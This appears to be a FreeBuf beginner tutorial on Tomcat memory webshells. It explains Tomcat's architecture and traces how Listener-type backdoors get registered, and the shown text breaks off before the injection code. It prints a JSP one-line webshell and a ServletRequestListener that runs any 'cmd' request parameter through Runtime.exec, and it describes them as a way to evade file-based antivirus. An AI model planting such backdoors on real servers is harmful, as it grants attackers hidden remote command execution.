---
title: Java安全-Tomcat内存马详解(新手友好)
url: https://www.freebuf.com/vuls/422582.html
source: FreeBuf网络安全行业门户
date: 2025-02-26
fetch_date: 2025-10-06T20:37:08.749099
---

# Java安全-Tomcat内存马详解(新手友好)

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

Java安全——Tomcat内存马详解(新手友好)

* ![]()
* 关注

* [漏洞](https://www.freebuf.com/articles/vuls)

Java安全——Tomcat内存马详解(新手友好)

2025-02-25 12:10:41

所属地 山东省

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

作为后来的学习者和探索者，我深知自己站在巨人的肩膀上。每一项技术的进步背后，都有无数前人的辛勤付出与深思熟虑。正是他们的努力，才为我提供了这片沃土，让我能够在这个基础上继续思考和前行。虽然这篇文章只能算作我在这个领域的一次小小尝试，但我更希望它能成为对前辈们探索精神的一种致敬，并为后续的师傅提供一些参考和启发。

环境：

* tomcat 9.0.68
* java8
* idea

## JSP木马

在普通的webshell攻击中，恶意代码通常存储在硬盘或外部设备上，以文件的形式存在（php、jsp），例如，以下是一个简单一句话木马。

```
<%
Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));
System.out.println(process);
%>
```

在实战中，我们需要通过文件上传漏洞将webshell传到服务器。

传统的安全防护主要集中在文件系统层面，例如杀毒软件、文件监控、反病毒检测等，它们通过扫描硬盘上的恶意文件来发现和拦威胁，且传统的安全防护技术手段越来越成熟，导致现在的webshell容易被查杀

而Java内存马则不同，它将恶意代码直接加载到内存中运行。因为代码是直接在内存中执行的，它不需要保存到硬盘上，这使得它很难被传统的杀毒软件发现和检测。

## 传统web应用内存马（Tomcat内存马）

tomcat内存马主要有三个类型，Listener型、Filter型、Servlet型，正好对应java web应用的三大组件，因此Tomcat内存马的实现原理是利用Java动态类加载和反射机制，动态注册恶意的Listener、Filter、Servlet或Valve等组件到Tomcat容器中，从而在内存中持久化恶意代码，实现隐蔽的攻击触发。

在正式开始学习内存马之前，建议了解一下Tomcat的架构

## Tomcat架构

Apache Tomcat是由Apache软件基金会旗下的Jakarta项目开发的开源Servlet容器，实现了对Servlet和JavaServer Pages（JSP）的全面支持。由于其内含HTTP服务器功能，Tomcat既可以作为独立的Web服务器运行，也能与传统Web服务器配合使用，广泛应用于从中小型企业到大型企业级的Java Web应用开发中。

![1740239386_67b9f21a462bf9a5b1776.png!small](https://image.3001.net/images/20250222/1740239386_67b9f21a462bf9a5b1776.png!small)

可以看到Tomcat Server大致可以分为三个组件，Service、Connector、Container

### service

**Service**是 Tomcat 的一个主要组件，负责组织和管理 **Connector**和 **Container**的工作。一个 **Service**可以包含多个 **Connector**和 **Container**。它的作用是将所有相关的资源和功能组合在一起，确保 Tomcat 在处理请求时能够高效地协同工作。

### Connector（连接器）

**Connector**负责接收来自客户端（如浏览器）的请求，并将这些请求传递给 **Container**进行处理。它处理网络协议（如 HTTP、HTTPS）和客户端与服务器之间的连接。

### **Container（容器）**

**Container**是 Tomcat 的核心，负责实际处理 HTTP 请求的业务逻辑。包含四种子容器：`Engine`、`Host`、`Context`和`Wrapper`其中，一个Container对应一个Engine，一个Engine可以包含多个Host，一个Host可以包含多个Context，Context又包含多个Wrapper，各子容器的功能如下

Engine

**Engine**是 **Container**中的最顶层组件，负责处理所有的请求。它是 Tomcat 中的请求分发器，能够协调和管理所有的 **Host**

Host（主机）

**Host**代表一个虚拟主机。一个 **Host**通常对应一个域名或一个 IP 地址，它处理和管理特定的 Web 应用程序（通常对应于一个或多个网站）。每个 **Host**可以包含多个 **Context**，每个 **Context**对应一个 Web 应用。

Context（上下文）

**Context**代表一个 Web 应用，是 Tomcat 中的一个应用级容器。一个 **Context**通常对应一个单独的 Web 应用，它可以包含多个 Servlet、JSP 文件、HTML 页面等内容。同一个Host里面不同的Context，其contextPath必须不同，默认Context的contextPath为空格(“”)或斜杠(/)

下面找一个Tomcat的文件目录对照一下，如下图所示：

![1740239406_67b9f22e2e72299267358.png!small](https://image.3001.net/images/20250222/1740239406_67b9f22e2e72299267358.png!small)

Context和Host的区别是Context表示一个应用，我们的Tomcat中默认的配置下webapps下的每一个文件夹目录都是一个Context，其中ROOT目录中存放着主应用，其他目录存放着子应用，而整个webapps就是一个Host站点。

Wrapper（封装器）

**Wrapper**是 **Container**中的一个组件，一个**Container**可以对应多个wrapper。它负责封装一个 **Servlet**。每个 **Wrapper**对应一个 Servlet，它管理该 Servlet 的生命周期（初始化、请求处理、销毁）。**Wrapper**是 **Context**中的一个重要组成部分，它决定了 **Servlet**如何在 Tomcat 中被加载和执行。

可以用一张图来表示请求在Container中的解析过程

![1740239421_67b9f23d901d2f6302ec4.png!small](https://image.3001.net/images/20250222/1740239421_67b9f23d901d2f6302ec4.png!small)

当访问`https://manage.xxx.com:8080/user/list`时，Tomcat 会按照以下流程处理请求：

1. **请求接收：**客户端通过 HTTPS 协议向 Tomcat 的 8080 端口发送请求。
2. **Connector 处理：**Tomcat 的`Connector`组件接收请求，并将其转换为内部的`Request`对象。
3. **Engine 路由：**`Engine`组件根据请求的主机名（`manage.xxx.com`）确定目标`Host`。
4. **Host 路由：**`Host`组件根据请求的路径（`/user/list`）确定目标`Context`。
5. **Context 路由：**`Context`组件根据请求的路径确定目标`Wrapper`。
6. **Wrapper 调用 Servlet：**`Wrapper`调用其封装的`Servlet`的`service()`方法，处理请求并生成响应。
7. **响应返回：**生成的响应通过上述层次返回给客户端。

了解了Tomcat容器之后，我们正式发车，开启内存马的学习之旅。

## Listener型

`Listener`是最先被加载的，根据前面内存马的实现思路，只要动态注册一个恶意的`Listener`，就又可以形成一种内存马了。在tomcat中Listener分为`ServletContextListener`、`HttpSessionListener`或`ServletRequestListener`，很明显`ServletRequestListener`是最适合做内存马的，因为访问任何服务就能触发操作。

### 编写一个简单的ServletRequestListener

```
package com.example.listenshell;
​
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
​
@WebListener
public class Shell_Listener implements ServletRequestListener {
@Override
public void requestInitialized(ServletRequestEvent sre) {
HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
String cmd = request.getParameter("cmd"); // 从请求参数中获取命令
if (cmd != null) {
try {
Runtime.getRuntime().exec(cmd); // 执行命令
} catch (IOException e) {
e.printStackTrace(); // 打印异常信息
}
}
}
​
@Override
public void requestDestroyed(ServletRequestEvent sre) {
// 这里可以添加请求销毁时的逻辑（如果需要）
}
}
```

运行结果：

![1740273466_67ba773a45758b92009f9.png!small?1740273467895](https://image.3001.net/images/20250223/1740273466_67ba773a45758b92009f9.png!small?1740273467895)

### 从代码层面分析Listener的创建流程

先来看一下调用栈

![1740239533_67b9f2ad9c5d550674c94.png!small](https://image.3001.net/images/20250222/1740239533_67b9f2ad9c5d550674c94.png!small)

查看StandardContext类的fireRequestInitEvent方法，可见fireRequestInitEvent()调用了我们Listener的requestInitialized()方法

```
public boolean fireRequestInitEvent(ServletRequest request) {
​
Object instances[] = getApplicationEventListeners();
​
if ((instances != null) && (instances.length > 0)) {
​
ServletRequestEvent event =
new ServletRequestEvent(getServletContext(), request);
​
for (int i = 0; i < instances.length; i++) {
if (instances[i] == null)
continue;
if (!(instances[i] instanceof ServletRequestListener))
continue;
ServletRequestListener listener =
(ServletRequestListener) instances[i];
​
try {
listener.requestInitialized(event);
} catch (Throwable t) {
ExceptionUtils.handleThrowable(t);
getLogger().error(sm.getString(
"standardContext.requestListener.requestInit",
instances[i].getClass().getName()), t);
request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, t);
return false;
}
}
}
return true;
}
```

![1740239570_67b9f2d212846cb1ec0da.png!small](https://image.3001.net/images/20250222/1740239570_67b9f2d212846cb1ec0da.png!small)

我们往前跟，看下listener是从哪里来的。直接右键查看声明或用例，在前两行找到了listener的实现，来自于instances[i]，在旁边也显示出listener就是我们创建的Shell\_Listener，那就说明至少在这一步或者前一步我们的listener已经被创建了。

![1740239584_67b9f2e0970f599b6971e.png!small](https://image.3001.net/images/20250222/1740239584_67b9f2e0970f599b6971e.png!small)

我们继续往前跟，查看instances[i]是怎么产生的。最终定位到这里，显示listener已经存在。

![1740239601_67b9f2f16cd25e40154d2.png!small](https://image.3001.net/images/20250222/1740239601_67b9f2f16cd25e40154d2.png!small)

继续跟进getApplicationEventListeners()

![1740239624_67b9f30896ad7f92dedfe.png!small](https://image.3001.net/images/20250222/1740239624_67b9f30896ad7f92dedfe.png!small)

经过询问AI，这段代码的作用是将存储在`applicationEventListenersList`集合中的所有事件监听器对象转换为数组，并返回给调用者。那么，意思就是Listener实际上是存储在`applicationEventListenersList`属性中。

所以我们的下一步就要找到Litener是如何被添加到applicationEventListenersList中的，这里我们直接查找用法，不出意外找到了五处`applicationEventListenersList`被应用的地方。

![1740239664_67b9f330877bc9143e529.png!small](https://image.3001.net/images/20250222/1740239664_67b9f330877bc9143e529.png!small)

根据字面意思，addApplicationEventListener（）是最有可能监听器被添加的地方。不出所料。

![1740239685_67b9f34541e84a4fd161b.png!small](https://image.3001.net/images/20250222/1740239685_67b9f34541e84a4fd161b.png!small)

### 编写Listener内存马

根据我们在上面的内容，我们可以得出以下结论：

如果我们想要写...